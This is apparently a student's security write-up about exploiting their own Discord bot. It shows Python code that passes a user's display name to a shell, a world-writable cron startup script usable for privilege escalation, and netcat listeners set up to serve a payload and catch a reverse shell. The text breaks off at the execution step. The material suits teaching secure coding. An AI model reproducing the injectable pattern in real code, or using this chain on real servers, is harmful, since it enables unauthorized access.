# Exploiting Discord Bot Vulnerability to Gain Access to Game Server Files

## Introduction
I own a personal server that hosts both a game server and a Discord bot, which provides various functionalities to players, such as displaying game statistics, rolling dice, and many others.

The Discord bot is a program that continuously listens to messages in a designated chat channel and executes commands or functions depending on the message content.

During a Cybersecurity course, I discovered a vulnerability in the Discord bot’s Python code that allows remote code execution without requiring user interaction. Exploiting this flaw, combined with a misconfiguration in the file permissions of a script, I was able to gain unauthorized access to the game server’s files.

### Server Enviroment
The game server and the Discord bot are running under two different system users to enforce a basic privilege separation:

- The Discord bot runs under `user-a`.
- The game server runs under `user-b`, which owns all the game files.


### Vulnerability
The Vulnerability is a line in the code of the funcion "dice" that permits code injection by changing the username of the Discord Accounts
```python
if message.content.startswith('!dice'):
    dice = random.randint(1,6)
    username = message.author.display_name
    subprocess.run(f'python3 ./logWriter.py {username} {dice}', shell=True)  <---------
    await message.channel.send(f"{username}, hai estratto: {dice}")
```
Since the code is executed in a shell, inserting a ; in the username allows the shell to treat what follows as a separate command instead of passing it as a parameter.
### Misconficuration
In addition to the code injection vulnerability, the system also presented a misconfiguration related to file permissions. The `server_start.sh` script, which is executed at system startup via a crontab entry belonging to `user-b`, was located inside `user-a`'s home directory with permissions set to `rwxrwxrwx`, allowing any user on the system to modify it.

Since this script is executed by the game server process running under `user-b`, modifying its content and then restarting the server makes it possible to execute arbitrary code with `user-b`'s privileges, ultimately granting access to the game server files.


## Threat model
- Attacker has access to send messages in the Discord chat monitored by the bot.  
- Attacker is aware of the injection vulnerability in the bot’s username handling.

## Attacker Setup
The Attacker uses 2 netcat processes, one listening on 8080, the other on 8081.
#### Server process 1
```
while true; do
nc -l -p 8080 -w 1 < response.txt
done
```
#### Server process 2
```
nc -lvnp 8081
```
In the response.txt file there is the payload that the attacker wants to execute.

## Execution
